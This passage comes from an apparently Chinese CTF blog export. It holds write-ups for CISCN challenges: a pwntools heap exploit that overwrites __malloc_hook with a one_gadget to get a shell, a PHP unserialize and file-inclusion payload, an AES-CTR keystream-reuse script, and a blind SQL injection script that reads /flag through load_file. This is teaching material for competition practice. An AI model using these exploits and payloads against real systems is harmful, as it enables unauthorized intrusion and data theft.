class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"4\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span> \n\tcreate(<span class=\"hljs-string\">\"1\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#0</span>\n\tcreate(<span class=\"hljs-string\">\"1\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-string\">\"2\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#2</span>\n\tcreate(<span class=\"hljs-string\">\"3\"</span>*<span class=\"hljs-number\">0x80</span>) <span class=\"hljs-comment\">#3</span>\n\tcreate(<span class=\"hljs-string\">\"3\"</span>*<span class=\"hljs-number\">0x80</span>) <span class=\"hljs-comment\">#4</span>\n\tfree(<span class=\"hljs-number\">3</span>)\n\tshow(<span class=\"hljs-number\">4</span>)\n\t<span class=\"hljs-keyword\">if</span> local:\n\t\t<span class=\"hljs-keyword\">pass</span>\n\t<span class=\"hljs-keyword\">else</span>:\n\t\t<span class=\"hljs-keyword\">pass</span>\n\t\t<span class=\"hljs-comment\">#p.recvuntil(\"Info index: \")</span>\n\t\t<span class=\"hljs-comment\">#p.recvuntil(\"Info index: \")</span>\n\tdata = u64(p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-keyword\">True</span>)+<span class=\"hljs-string\">\"\\x00\\x00\"</span>) libc_base = data - <span class=\"hljs-number\">0x3c4b78</span>\n\tmalloc_hook = libc_base + <span class=\"hljs-number\">0x3c4b10</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span> print(<span class=\"hljs-string\">\"malloc_hook = \"</span> + str(hex(malloc_hook))) print(<span class=\"hljs-string\">\"one_shot = \"</span> + str(hex(one_shot))) free(<span class=\"hljs-number\">1</span>)\n\tfree(<span class=\"hljs-number\">2</span>)\n\tedit(<span class=\"hljs-number\">0</span>,p64(malloc_hook - <span class=\"hljs-number\">19</span>))\n\tcreate(<span class=\"hljs-string\">\"4\"</span>*<span class=\"hljs-number\">0x60</span>)\n\tcreate(<span class=\"hljs-string\">\"5\"</span>*<span class=\"hljs-number\">0x60</span>)\n\tpayload = <span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">3</span> + p64(one_shot)\n\tpayload = payload.ljust(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\n\tcreate(payload)\n\tcreate(<span class=\"hljs-string\">\"icq0030af22ece42d03523c08138525f\"</span>)\n\tp.interactive()\nexp()</code></pre></p>\n<p><img src=\"/img/2019-04-23/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"justSoso\"><a href=\"#justSoso\" class=\"headerlink\" title=\"justSoso\"></a>justSoso</h4><p><code>http://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>通过文件包含拿到hint.php和index.php的源码<br><pre><code class=\"hljs php\"><span class=\"hljs-comment\">//index.php</span>\n&lt;html&gt;\n<span class=\"hljs-meta\">&lt;?php</span>\nerror_reporting(<span class=\"hljs-number\">0</span>); \n$file = $_GET[<span class=\"hljs-string\">\"file\"</span>]; \n$payload = $_GET[<span class=\"hljs-string\">\"payload\"</span>];\n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($file))&#123;\n\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'Missing parameter'</span>.<span class=\"hljs-string\">'&lt;br&gt;'</span>;\n&#125;\n<span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">\"/flag/\"</span>,$file))&#123;\n\t<span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'hack attacked!!!'</span>);\n&#125;\n@<span class=\"hljs-keyword\">include</span>($file);\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($payload))&#123;  \n    $url = parse_url($_SERVER[<span class=\"hljs-string\">'REQUEST_URI'</span>]);\n    parse_str($url[<span class=\"hljs-string\">'query'</span>],$query);\n    <span class=\"hljs-keyword\">foreach</span>($query <span class=\"hljs-keyword\">as</span> $value)&#123;\n        <span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">\"/flag/\"</span>,$value)) &#123; \n    \t    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'stop hacking!'</span>);\n    \t    <span class=\"hljs-keyword\">exit</span>();\n        &#125;\n    &#125;\n    $payload = unserialize($payload);\n&#125;<span class=\"hljs-keyword\">else</span>&#123; \n   <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"Missing parameters\"</span>; \n&#125; \n<span class=\"hljs-meta\">?&gt;</span>\n&lt;!--Please test index.php?file=xxx.php --&gt;\n&lt;!--Please get the source of hint.php--&gt;\n&lt;/html&gt;\n\n<span class=\"hljs-comment\">//hint.php</span>\n<span class=\"hljs-meta\">&lt;?php</span>  \n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Handle</span></span>&#123; \n    <span class=\"hljs-keyword\">private</span> $handle;  \n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">foreach</span>(get_object_vars(<span class=\"hljs-keyword\">$this</span>) <span class=\"hljs-keyword\">as</span> $k =&gt; $v) &#123;\n            <span class=\"hljs-keyword\">$this</span>-&gt;$k = <span class=\"hljs-keyword\">null</span>;\n        &#125;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"Waking up\\n\"</span>;\n    &#125;\n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($handle)</span> </span>&#123; \n        <span class=\"hljs-keyword\">$this</span>-&gt;handle = $handle; \n    &#125; \n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;handle-&gt;getFlag();\n\t&#125;\n&#125;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;\n    <span class=\"hljs-keyword\">public</span> $file;\n    <span class=\"hljs-keyword\">public</span> $token;\n    <span class=\"hljs-keyword\">public</span> $token_flag;\n \n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($file)</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;file = $file;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;token_flag = <span class=\"hljs-keyword\">$this</span>-&gt;token = md5(rand(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10000</span>));\n    &#125;\n    \n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;token_flag = md5(rand(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10000</span>));\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;token === <span class=\"hljs-keyword\">$this</span>-&gt;token_flag)\n\t\t&#123;\n\t\t\t<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;\n\t\t\t\t<span class=\"hljs-keyword\">echo</span> @highlight_file(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-keyword\">true</span>); \n            &#125;  \n        &#125;\n    &#125;\n&#125;\n?</code></pre></p>\n<p>parse_url存在绕过的漏洞，例如：<code>http://127.0.0.1///index.php</code><br>构造payload<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Handle</span></span>&#123;\n    <span class=\"hljs-keyword\">private</span> $handle;\n\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($handle)</span> </span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;handle = $handle;\n\n\n    &#125;\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span><span class=\"hljs-params\">()</span></span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;handle-&gt;getFlag();\n    &#125;\n&#125;\n\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;\n    <span class=\"hljs-keyword\">public</span> $file;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($file)</span></span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;file = $file;\n    &#125;\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;\n            <span class=\"hljs-keyword\">echo</span> @highlight_file(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-keyword\">true</span>);\n        &#125;\n    &#125;\n&#125;\n\n$flag = <span class=\"hljs-keyword\">new</span> Flag(<span class=\"hljs-string\">'flag.php'</span>);\n$flag -&gt;token = &amp;$flag -&gt; token_flag;\n$exp = <span class=\"hljs-keyword\">new</span> Handle($flag);\n<span class=\"hljs-keyword\">echo</span> urlencode(serialize($exp)).PHP_EOL;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>得到以下payload<br><pre><code class=\"hljs undefined\">O<span class=\"hljs-meta\">%3A6</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A1</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A14</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%00Handle</span><span class=\"hljs-meta\">%00handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BO</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A3</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22file</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A8</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22flag</span>.php<span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A10</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token_flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BN</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A5</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BR</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3B</span><span class=\"hljs-meta\">%7D</span><span class=\"hljs-meta\">%7D</span>\n\nurldecode:\nO:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"Handle\"</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\".Handle.handle\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Flag\"</span>:<span class=\"hljs-number\">3</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"flag.php\"</span>;s:<span class=\"hljs-number\">10</span>:<span class=\"hljs-string\">\"token_flag\"</span>;N;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"token\"</span>;R:<span class=\"hljs-number\">4</span>;&#125;&#125;</code></pre></p>\n<p>还要把一个的1改为2，不然会跳进Waking up函数<br><pre><code class=\"hljs undefined\">O<span class=\"hljs-meta\">%3A6</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A2</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A14</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%00Handle</span><span class=\"hljs-meta\">%00handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BO</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A3</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22file</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A8</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22flag</span>.php<span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A10</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token_flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BN</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A5</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BR</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3B</span><span class=\"hljs-meta\">%7D</span><span class=\"hljs-meta\">%7D</span>\n\nurldecode:\nO:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"Handle\"</span>:<span class=\"hljs-number\">2</span>:&#123;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\".Handle.handle\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Flag\"</span>:<span class=\"hljs-number\">3</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"flag.php\"</span>;s:<span class=\"hljs-number\">10</span>:<span class=\"hljs-string\">\"token_flag\"</span>;N;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"token\"</span>;R:<span class=\"hljs-number\">4</span>;&#125;&#125;</code></pre></p>\n<p><img src=\"/img/2019-04-23/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h3 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h3><h4 id=\"puzzle\"><a href=\"#puzzle\" class=\"headerlink\" title=\"puzzle\"></a>puzzle</h4><h5 id=\"question-0\"><a href=\"#question-0\" class=\"headerlink\" title=\"question-0\"></a>question-0</h5><p><img src=\"/img/2019-04-23/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br><pre><code class=\"hljs undefined\"><span class=\"hljs-symbol\">a1:</span><span class=\"hljs-number\">0xfa6</span>\n\n<span class=\"hljs-symbol\">a2:</span><span class=\"hljs-number\">0xbed</span>\n\n<span class=\"hljs-symbol\">a3:</span><span class=\"hljs-number\">0x9c7</span>\n\n<span class=\"hljs-symbol\">a4:</span><span class=\"hljs-number\">0xa00</span></code></pre></p>\n<h5 id=\"part1\"><a href=\"#part1\" class=\"headerlink\" title=\"part1\"></a>part1</h5><p>看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表<br><img src=\"/img/2019-04-23/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399</p>\n<h5 id=\"part2\"><a href=\"#part2\" class=\"headerlink\" title=\"part2\"></a>part2</h5><p><img src=\"/img/2019-04-23/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>脚本也可解：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> sympy <span class=\"hljs-keyword\">as</span> sy\nx = sy.symbols(<span class=\"hljs-string\">'x'</span>)\nprint(sy.integrate(sy.exp(x)*pow(<span class=\"hljs-number\">4</span> + sy.exp(x),<span class=\"hljs-number\">2</span>), (x, float(<span class=\"hljs-number\">0</span>), sy.log(<span class=\"hljs-number\">2</span>)))) \nrerult : <span class=\"hljs-number\">30.3333333333333</span>\n(<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">30.3333333</span>≈<span class=\"hljs-number\">9</span>*<span class=\"hljs-number\">31</span>+<span class=\"hljs-number\">7</span>+<span class=\"hljs-number\">1</span>)=<span class=\"hljs-number\">100</span>\npart2 = （<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">91</span>+<span class=\"hljs-number\">7</span>+<span class=\"hljs-number\">1</span>）*<span class=\"hljs-number\">77</span> =<span class=\"hljs-number\">7700</span>\nhex(<span class=\"hljs-number\">7700</span>)=<span class=\"hljs-number\">0x1e14</span></code></pre></p>\n<h5 id=\"part3\"><a href=\"#part3\" class=\"headerlink\" title=\"part3\"></a>part3</h5><p><img src=\"/img/2019-04-23/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br><img src=\"/img/2019-04-23/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>part3 = 0x48d0</p>\n<h5 id=\"part4\"><a href=\"#part4\" class=\"headerlink\" title=\"part4\"></a>part4</h5><p><img src=\"/img/2019-04-23/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br><img src=\"/img/2019-04-23/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>part 4 =hex(40320)=0x9d80</p>\n<h4 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h4><p>本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。<br>则详细脚本如下：<br><pre><code class=\"hljs python\">data1 = <span class=\"hljs-string\">\"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7\"</span> \n\ndata2 = <span class=\"hljs-string\">\"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4\"</span>\ns1 = [data1[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">32</span>],data1[<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>],data1[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>]]\ns2 = [data2[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">32</span>],data2[<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">4</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">5</span>], data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">6</span>]]\nming=<span class=\"hljs-string\">\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"</span>\nminghex=ming.encode(<span class=\"hljs-string\">\"hex\"</span>)\nkey1=int(s1[<span class=\"hljs-number\">0</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nkey2=int(s1[<span class=\"hljs-number\">1</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nkey3=int(s1[<span class=\"hljs-number\">2</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nminghex0=int(s2[<span class=\"hljs-number\">0</span>],<span class=\"hljs-number\">16</span>)^key1\nminghex1=int(s2[<span class=\"hljs-number\">1</span>],<span class=\"hljs-number\">16</span>)^key2\nminghex2=int(s2[<span class=\"hljs-number\">2</span>],<span class=\"hljs-number\">16</span>)^key3\n<span class=\"hljs-keyword\">print</span> hex(minghex0)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)\n<span class=\"hljs-keyword\">print</span> hex(minghex1)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)\n<span class=\"hljs-keyword\">print</span> hex(minghex2)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)</code></pre></p>\n<p><img src=\"/img/2019-04-23/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"></p>\n<h4 id=\"Asymmetric\"><a href=\"#Asymmetric\" class=\"headerlink\" title=\"Asymmetric\"></a>Asymmetric</h4><p>看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把<strong>n</strong>分解<br><img src=\"/img/2019-04-23/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>剩下就 很简单了<br><img src=\"/img/2019-04-23/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"></p>\n<h3 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h3><h4 id=\"EasyGo\"><a href=\"#EasyGo\" class=\"headerlink\" title=\"EasyGo\"></a>EasyGo</h4><p>查看可执行文件格式<br><img src=\"/img/2019-04-23/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"><br>程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到<code>sub_495150</code>函数，执行完<code>sub_4886B0</code>,程序打印了字符串<br><img src=\"/img/2019-04-23/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"><br>在<code>sub_48EB00</code>中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了<code>rax</code>，并在接下来的几个<code>CALL</code>中，对其进行了一些操作，这里没有仔细跟进，由于在<code>sub_47E620</code>函数处存在跳转,猜测这里可能为相关的<code>check</code>函数，重点关注其所对应的内存区域，可发现，执行完<code>sub_47E620</code>函数后,可以在内存中直接拿到flag</p>"},{"title":"国赛华南赛区的一道注入题","index_img":"/img/2019-06-25/index.jpg","date":"2019-06-25T08:53:12.000Z","_content":"这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）  \n<!--more-->\n题目环境搭建`apache2+php7.2+mysql`  \n```\nubuntu  \napt-get install apache2 php7.2 mysql-server php7.2-mysql libapache2-mod-php  \n  \nmysql  \n/etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = \"/\"  \nGRANT FILE ON *.* TO 'www-data'@'%';  \nGRANT ALL PRIVILEGES ON `test`.`user` TO 'www-data'@'%';  \n```\n注入点判断payload，过滤了很多参数  \n```\nadmin'/**/or/**/'1'='1'#  \n```\n成功登陆后提示flag在根目录  \n![1](/img/2019-06-25/1.png)  \nmysql读取文件有个方法是用load_file这个命令,具体用法如下  \n```\nmysql> select load_file('/flag');  \n+--------------------------+  \n| load_file('/flag')       |  \n+--------------------------+  \n| ciscn{T2UXiFeu7HzoBj4R}  |  \n+--------------------------+  \n1 row in set (0.01 sec)  \n```\n因为and被过滤了，`^`（异或）没有，所以判断语句如下  \n```\nadmin'^1^1#  \n```\n`^`符号的用法如下  \n```\nmysql> select * from user where username = 'admin'^1^1;  \n+----------+----------+  \n| username | password |  \n+----------+----------+  \n| admin    | admin123 |  \n+----------+----------+  \n1 row in set, 2 warnings (0.00 sec)  \n  \nmysql> select * from user where username = 'admin'^1^0;  \nEmpty set, 2 warnings (0.00 sec)  \n```\n因此我们需要构造判断结果为1的查询语句，这里要用到`like`这个方法  \n```\nmysql> select username like 'a%' from user;  \n+--------------------+  \n| username like 'a%' |  \n+--------------------+  \n|                  1 |  \n+--------------------+  \n1 row in set (0.00 sec)  \n  \nmysql> select username like 'b%' from user;  \n+--------------------+  \n| username like 'b%' |  \n+--------------------+  \n|                  0 |  \n+--------------------+  \n1 row in set (0.00 sec)  \n```\n结合上面我们的payload为  \n```\nadmin'^1^(select/**/load_file('/flag')/**/like/**/'c%')  \n```\npython脚本如下  \n```python\nimport requests\nimport string\nurl = 'http://192.168.1.205/ciscn12/web4/index.php'\ndef query(data):\n\tglobal url\n\tpayload = \"admin'^1^(select/**/load_file('/flag')/**/like/**/'{data}%')#\".format(data = data)\n\tproxies = {\"http\": \"http://127.0.0.1:8080\",\"https\": \"http://127.0.0.1:8080\",}\n\tdata = {'username':payload,'password':'1'}\n\treq = requests.post(url = url,data = data)\n\tlength = len(req.text)\n\treturn length\nif __name__ == '__main__':\n\tflag = ''\n\tstr = string.letters+string.digits+'{'+'}'\n\tfor j in range(50):\n\t\tfor i in str:\n\t\t\tflag += i\n\t\t\tres = query(flag)\n\t\t\tif(res == 462):\n\t\t\t\tbreak\n\t\t\telse:\n\t\t\t\tflag = flag[:-1]\n\t\tprint flag\n\t\tif i == '}':\n\t\t\tbreak\n```\nresult  \n```\nc  \nci  \ncis  \ncisc  \nciscn  \nciscn{  \nciscn{T  \nciscn{T2  \nciscn{T2U  \nciscn{T2UX  \nciscn{T2UXi  \nciscn{T2UXiF  \nciscn{T2UXiFe  \nciscn{T2UXiFeu  \nciscn{T2UXiFeu7  \nciscn{T2UXiFeu7H  \nciscn{T2UXiFeu7Hz  \nciscn{T2UXiFeu7Hzo  \nciscn{T2UXiFeu7HzoB  \nciscn{T2UXiFeu7HzoBj  \nciscn{T2UXiFeu7HzoBj4  \nciscn{T2UXiFeu7HzoBj4R  \nciscn{T2UXiFeu7HzoBj4R}  \n```\n待更新","source":"_posts/2019-06-25-guosaiwp1.md","raw":"---\ntitle: 国赛华南赛区的一道注入题\nindex_img: /img/2019-06-25/index.jpg\ndate: 2019-06-25 16:53:12\ntags:\n- writeup\n- web\n- 注入\n---\n这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）  \n<!--more-->\n题目环境搭建`apache2+php7.2+mysql`  \n```\nubuntu  \napt-get install apache2 php7.2 mysql-server php7.2-mysql libapache2-mod-php  \n  \nmysql  \n/etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = \"/\"  \nGRANT FILE ON *.* TO 'www-data'@'%';  \nGRANT ALL PRIVILEGES ON `test`.`user` TO 'www-data'@'%';  \n```\n注入点判断payload，过滤了很多参数  \n```\nadmin'/**/or/**/'1'='1'#  \n```\n成功登陆后提示flag在根目录  \n![1](/img/2019-06-25/1.png)  \nmysql读取文件有个方法是用load_file这个命令,具体用法如下  \n```\nmysql> select load_file('/flag');  \n+--------------------------+  \n| load_file('/flag')       |  \n+--------------------------+  \n| ciscn{T2UXiFeu7HzoBj4R}  |  \n+--------------------------+  \n1 row in set (0.01 sec)  \n```\n因为and被过滤了，`^`（异或）没有，所以判断语句如下  \n```\nadmin'^1^1#  \n```\n`^`符号的用法如下  \n```\nmysql> select * from user where username = 'admin'^1^1;  \n+----------+----------+  \n| username | password |  \n+----------+----------+  \n| admin    | admin123 |  \n+----------+----------+  \n1 row in set, 2 warnings (0.00 sec)  \n  \nmysql> select * from user where username = 'admin'^1^0;  \nEmpty set, 2 warnings (0.00 sec)  \n```\n因此我们需要构造判断结果为1的查询语句，这里要用到`like`这个方法  \n```\nmysql> select username like 'a%' from user;  \n+--------------------+  \n| username like 'a%' |  \n+--------------------+  \n|                  1 |  